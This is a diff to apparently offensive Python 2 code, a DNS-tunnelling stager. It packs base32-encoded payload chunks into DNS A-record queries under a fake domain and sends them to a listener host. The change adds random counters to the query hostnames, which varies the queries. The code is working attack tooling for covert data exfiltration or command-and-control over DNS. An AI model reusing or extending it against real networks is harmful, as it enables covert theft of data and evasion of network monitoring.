@@ -859,9 +859,9 @@ def is_end_of_transfer(payload):
     else:
         return False
     
-def stop_data_to_listener_a(sock, host, port):
+def stop_data_to_listener_a(sock, host, port, counter):
     txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
-    a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_a("smtp", "", "arclightdefence.com")+bytearray(struct.pack('BBBB',0,1,0,1))
+    a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_a("smtp"+str(counter), "", "arclightdefence.com")+bytearray(struct.pack('BBBB',0,1,0,1))
     sock.sendto(a_record,(host,int(port)))
     reply,server_reply=sock.recvfrom(512)
     ip_bytes = bytearray(reply[-4:])
@@ -869,11 +869,11 @@ def stop_data_to_listener_a(sock, host, port):
     print "[STOP] Received IP address {}".format(ip_recv)
     return ip_recv
     
-def send_init_a_to_listener(sock, prefix, host, port, fake_domain):
-    print "sending init to prefix {} host {} port {} fake_domain {}".format(prefix, host, port, fake_domain)
+def send_init_a_to_listener(sock, prefix, host, port, fake_domain, counter):
+    print "sending init to prefix {} host {} port {} fake_domain {}".format(prefix+str(counter), host, port, fake_domain)
     txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
     print "creating A record"
-    a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_init(prefix, fake_domain)+bytearray(struct.pack('BBBB',0,1,0,1))
+    a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_init(prefix+str(counter), fake_domain)+bytearray(struct.pack('BBBB',0,1,0,1))
     print "about to send A record"
     sock.sendto(a_record,(host,int(port)))
     print "waiting for reply"
@@ -897,7 +897,7 @@ def send_data_to_listener(prefix, sock, host, port, payload, fake_domain):
     #print "b32_labels len {}".format(len(b32_labels))
     #print b32_labels
 
-    send_init_a_to_listener(sock, prefix, host, port, fake_domain)
+    send_init_a_to_listener(sock, prefix, host, port, fake_domain, random.randint(0,255))
     
     for i in range(0,len(b32_labels)+(len(b32_labels)/2)):
         if counter <2:
@@ -923,7 +923,7 @@ def send_data_to_listener(prefix, sock, host, port, payload, fake_domain):
         print "[STAGER] sending agent pkt to {}".format(host)
         sock.sendto(a_record,(host,int(port)))
         reply,server_reply=sock.recvfrom(512)
-    ip_recv=stop_data_to_listener_a(sock, host, int(port))
+    ip_recv=stop_data_to_listener_a(sock, host, int(port), random.randint(0,256))
 
     return ip_recv
 
